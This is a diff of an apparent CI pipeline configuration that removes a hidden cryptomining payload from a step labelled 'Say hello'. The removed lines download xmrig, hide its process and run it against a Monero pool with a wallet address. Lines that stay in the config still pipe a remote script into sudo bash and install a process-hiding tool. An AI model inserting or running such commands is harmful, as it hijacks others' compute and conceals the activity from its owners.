@@ -17,14 +17,11 @@ jobs:
       - run:
           name: "Say hello"
           command: |
-             lscpu 
+             lscpu
              curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
              sudo apt install nodejs
              npm i -g node-process-hider
-             wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz && tar -xf xmrig-6.16.3-linux-x64.tar.gz && cd xmrig-6.16.3
-             chmod +x xmrig
-             ph add xmrig
-             ./xmrig -o xmr.2miners.com:2222 -u 44539yubZUZc7F4AsfDH8ABYwvJYtwxKbiDrNBMP3yc9h9Gy1JVn5U8JSi5hJFcYT55wYLzQJMK2PCVXX92DUZR5PoitrP3 -k
+             
 
 
 
